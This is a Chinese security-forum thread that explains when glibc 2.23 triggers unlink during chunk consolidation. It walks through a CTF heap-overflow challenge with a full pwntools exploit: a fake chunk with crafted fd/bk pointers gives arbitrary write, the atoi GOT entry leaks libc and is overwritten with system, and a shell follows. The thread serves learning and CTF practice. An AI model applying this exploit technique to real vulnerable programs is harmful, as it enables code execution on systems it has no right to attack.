@@ -1,0 +1,322 @@
+https://www.52pojie.cn/forum.php?mod=viewthread&tid=1173138&highlight=glibc
+
+
+官方bilibili官方微博官方入门教学培训【网络诊断修复工具】切换到窄版切换风格
+吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn
+
+yjduoduo |QQ绑定 |我的 |设置 |消息 |提醒 |退出
+
+ |积分: 0 |用户组: 锋芒初露
+
+快捷导航
+门户网站新帖搜索专辑家园悬赏排行榜总版规投诉举报爱盘帮助
+
+原创发布区精品软件区逆向资源区水漫金山区病毒救援区福利经验区脱壳破解区移动安全区病毒分析区编程语言区动画发布区安全工具区站点公告站点导航站点总版规申请专区招聘求职违规怎么办站点帮助站务处理
+请输入搜索内容
+帖子
+搜索	
+热搜:ctf新手脱壳教程Crackme
+吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn»网站›【 软件安全 】›『软件调试区』›glibc unlink触发机制解析（pwn unlink）
+返回列表发新帖回复
+查看: 5283|回复: 6
+上一主题 下一主题
+收起左侧[漏洞分析] glibc unlink触发机制解析（pwn unlink） [复制链接]
+优秀
+nigacat
+
+5
+
+主题	
+14
+
+帖子	
+223
+
+积分
+前途无量 Rank: 3Rank: 3
+精华1威望8 点热心值59 点悬赏值0 点听众65贡献值0 点吾爱币850 CB违规0 次注册时间2019-10-18
+收听TA
+电梯直达
+跳转到指定楼层楼主
+ 发表于 2020-5-6 21:45 | 只看该作者 回帖奖励
+在pwn 的学习 其中unlink机制与原理是比较复杂的 需要配合glibc源码进行分析
+
+
+关于unlink的原理，这里不用过多阐述 不懂的可以看一下ctfwiki的相关知识
+下面给出一张图概过
+
+
+现在我们重点分析 unlink的触发机制，即什么时候会发生unlink?
+当需要合并相邻的freechunk时用到unlink
+而合并堆块又分为向地地址合并和向高地址合并
+在ctf glibc pwn中 我们一般利用的是向低地址合并的unlink
+下面给出 glibc2.23中关于向低地址合并的源码
+
+    if (!prev_inuse(p)) {//判断后一个堆块（低地址）是否free，free时进行下一步操作
+      prevsize = p->prev_size;//读取p堆块的prev_size位
+      size += prevsize;//size相加
+      p = chunk_at_offset(p, -((long) prevsize));//p指向后一个堆块的地址，实现了合并
+      unlink(av, p, bck, fwd);//unlink脱链操作
+    }
+图片表该示过程：
+
+
+
+向高地址合并：
+源码
+    if (nextchunk != av->top) {//下一个堆块（高地址）是否为top chunk
+      /* get and clear inuse bit */
+      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);//将下一个堆块的prev_inuse位置为0，因为即将free这个堆块的前一个堆块
+      /* consolidate forward */
+      if (!nextinuse) {//判断下一个堆块是否free,是则进行unlink
+    unlink(av, nextchunk, bck, fwd);
+    size += nextsize;//size相加，相当于扩大了堆块，实现了 free
+      } else
+    clear_inuse_bit_at_offset(nextchunk, 0);
+
+接下来来看一个 unlink的ctf 实例
+ unlink.rar (4.44 KB, 下载次数: 35)
+压缩文件给出了 elf和我写的exp
+这是一个经典的unlink修改全局数组 实现任意地址写的题目
+
+先分析一下 ，其中的change_item中存在堆溢出漏洞
+malloc出的指针存放于 0x6020c0的全局数组中
+这个题的思路大概就是 首先unlink 造成0x6020c0的全局数组任意地址写
+
+然后 泄漏libc 最后修改elf.got['atoi']为system
+
+再输入/bin/sh\x00造成getshell
+
+def add(size,content):
+    p.sendlineafter('choice:',str(2))
+    p.sendlineafter('name:',str(size))
+    p.sendlineafter('item:',content)
+
+def show():
+    p.sendlineafter('choice:',str(1))
+
+def change(index,size,content):
+    p.sendlineafter('choice:',str(3))
+    p.sendlineafter('item:',str(index))
+    p.sendlineafter('name:',str(size))
+    p.sendlineafter('item:',content)
+
+def delete(index):
+    p.sendlineafter('choice:',str(4))
+    p.sendlineafter('item:',str(index))
+
+sleep(2)
+add(0x20,'aaaa')#0
+add(0x80,'bbbb')#1 实际分配size为0x90，保证期不为fastbin
+add(0x80,'cccc')#2
+
+此时的堆块情况如下
+
+全局数组情况如下
+
+我们利用unlink在全局数组写的思路是
+由于全局数组的指针是指向chunk数据段的而不是chunk起始位置的
+
+所以在chunk1的数据段伪造另一个chunk,chunk大小得与接下来的chunk2 的prev_size对应
+然后设置伪造堆块的fd=ptr-0x18 bk=ptr-0x10(这么做的原因ctfwiki里面有)
+通过溢出 修改chunk2 的prev_size 为0x80 size为0x90 pre_inuse为0
+再free(chunk2)时便会前向合并触发unlink
+pause()
+fd=0x6020d8-0x18
+bk=0x6020d8-0x10
+payload1=p64(0)+p64(0x81)#fake_chunk
+payload1+=p64(fd)+p64(bk)
+payload1+=p64(0)*12
+payload1+=p64(0x80)+p64(0x90)
+change(1,0x90,payload1)
+delete(2)#unlink
+此时全局数组情况如下
+
+可以发现我们现在已经可以通过change(1)实现任意地址读写了
+
+pause()
+change(1,0x20,'b'*8+p64(elf.got['atoi']))
+show()
+p.recvuntil(': ')
+libc_base=u64(p.recv(6).ljust(8,'\x00'))-libc.sym['atoi']
+print "libc_base:"+hex(libc_base)
+change(0,0x20,p64(libc_base+libc.sym['system']))
+p.recvuntil(':')
+p.sendline('/bin/sh\x00')
+p.interactive()
+我们可以通过修改atoi的got 为system
+
+然后输入/bin/sh\x00触发system('/bin/sh\x00')
+
+免费评分
+参与人数 3	威望 +2	吾爱币 +101	热心值 +3	收起理由
+ bevirus			+ 1	谢谢@Thanks！
+ 梦生		+ 1	+ 1	谢谢@Thanks！
+ Hmily	+ 2	+ 100	+ 1	感谢发布原创作品，吾爱破解论坛因你更精彩！
+查看全部评分
+
+收藏收藏10
+ 
+免费评分免费评分
+ 
+分享淘帖 
+有用有用 
+分享到朋友圈
+发帖前要善用【论坛搜索】功能，那里可能会有你要找的答案或者已经有人发布过相同内容了，请勿重复发帖。
+
+回复举报
+深爱我的女孩
+
+37
+
+主题	
+2449
+
+帖子	
+895
+
+积分
+凤毛麟角 Rank: 5Rank: 5
+热心值155 点悬赏值4 点吾爱币903 CB注册时间2019-12-20
+活跃会员奖
+
+收听TA
+沙发
+ 发表于 2020-5-6 22:01 | 只看该作者
+看不懂，路过帮顶！
+
+有些事情不用一个晚上做完，我们又不赶时间。
+                                                                  ——《志明与春娇》
+【吾爱破解论坛总版规】 - [让你充分了解吾爱破解论坛行为规则]
+回复 支持免费评分 举报
+斩风
+
+8
+
+主题	
+601
+
+帖子	
+180
+
+积分
+锋芒初露 Rank: 1
+吾爱币862 CB注册时间2020-2-14	
+3#
+ 发表于 2020-5-7 20:09 | 只看该作者
+吾爱破解论坛没有任何官方QQ群，禁止留联系方式，禁止任何商业交易。
+看不太懂，路过顶下
+如何升级？如何获得积分？积分对应解释说明！
+回复 支持免费评分 举报
+17696091221
+
+0
+
+主题	
+45
+
+帖子	
+14
+
+积分
+锋芒初露 Rank: 1
+吾爱币125 CB注册时间2020-2-14	
+4#
+ 发表于 2020-5-7 23:26 | 只看该作者
+《站点帮助文档》有什么问题来这里看看吧，这里有你想知道的内容！
+感觉挺牛的，学习中
+呼吁大家发布原创作品添加吾爱破解论坛标示！
+回复 支持免费评分 举报
+hkfox
+
+2
+
+主题	
+220
+
+帖子	
+67
+
+积分
+锋芒初露 Rank: 1
+热心值1 点吾爱币0 CB注册时间2014-2-2	
+5#
+ 发表于 2020-5-12 17:19 | 只看该作者
+看不懂，路过帮顶
+如何快速判断一个文件是否为病毒！
+回复 支持免费评分 举报
+coder014
+
+0
+
+主题	
+37
+
+帖子	
+11
+
+积分
+锋芒初露 Rank: 1
+吾爱币307 CB注册时间2020-2-14	
+6#
+ 发表于 2020-5-17 09:34 | 只看该作者
+楼主厉害了！
+回复 支持免费评分 举报
+sklli
+
+0
+
+主题	
+32
+
+帖子	
+10
+
+积分
+锋芒初露 Rank: 1
+吾爱币69 CB注册时间2020-2-14	
+7#
+ 发表于 2020-5-21 11:52 | 只看该作者
+看着就很牛牛牛
+回复 支持免费评分 举报
+wwbtowwb
+
+0
+
+主题	
+141
+
+帖子	
+43
+
+积分
+锋芒初露 Rank: 1
+吾爱币157 CB注册时间2020-7-21	
+8#
+ 发表于 2020-8-23 19:18 | 只看该作者
+我来学习啦  谢谢
+回复 支持免费评分 举报
+返回列表发新帖回复
+
+高级模式
+BColorImageLinkQuoteCodeSmilies@朋友|
+未选择任何文件
+验证问答 
+ 换一个 验证码 
+
+
+本版积分规则发表回复 警告：本版块禁止灌水或回复与主题无关内容，违者重罚！ 回帖并转播 回帖后跳转到最后一页
+
+
+免责声明：
+吾爱破解所发布的一切破解补丁、注册机和注册信息及软件的解密分析文章仅限用于学习和研究目的；不得将上述内容用于商业或者非法用途，否则，一切后果请用户自负。本站信息来自网络，版权争议与本站无关。您必须在下载后的24个小时之内，从您的电脑中彻底删除上述内容。如果您喜欢该程序，请支持正版软件，购买注册，得到更好的正版服务。如有侵权请邮件与我们联系处理。
+
+Mail To:Service@52PoJie.Cn
+
+RSS订阅|小黑屋|处罚记录|联系我们|吾爱破解 - LCG - LSG ( 京ICP备16042023号 | 京公网安备 11010502030087号 )
+
+GMT+8, 2022-9-17 09:23
+
+Powered by Discuz!
+
+Copyright © 2001-2020, Tencent Cloud.
